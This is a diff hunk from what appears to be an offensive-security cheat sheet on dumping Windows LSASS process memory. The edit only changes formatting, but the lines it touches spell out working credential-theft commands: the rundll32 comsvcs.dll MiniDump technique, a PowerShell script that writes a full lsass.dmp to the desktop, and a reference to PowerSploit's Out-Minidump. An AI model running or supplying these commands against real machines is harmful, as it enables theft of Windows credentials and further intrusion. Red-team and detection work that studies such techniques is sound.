@@ -21,12 +21,10 @@ This is a native Windows utility method which can we can use:<br>
 <code>rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_Process_ID> C:\path</code><br>
 for getting lsass process ID, you can RUN "Get-Process lsass" on powershell.
 * User can also done this by making a PS script containing the following:
-<code>
-$lsass = Get-Process lsass
+<code>$lsass = Get-Process lsass
 $dumpPath = "C:\Users\Adwin2\Desktop\lsass.dmp"
-rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $($lsass.Id) $dumpPath full
-</code>
-Note: Change $dumpPath
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $($lsass.Id) $dumpPath full</code><br><br>
+<b>Note</b>: Change $dumpPath
 
 ## 4. PowerSploit's Out-Minidump:
 Ensure the Out-Minidump function is loaded in your PowerShell session<br>
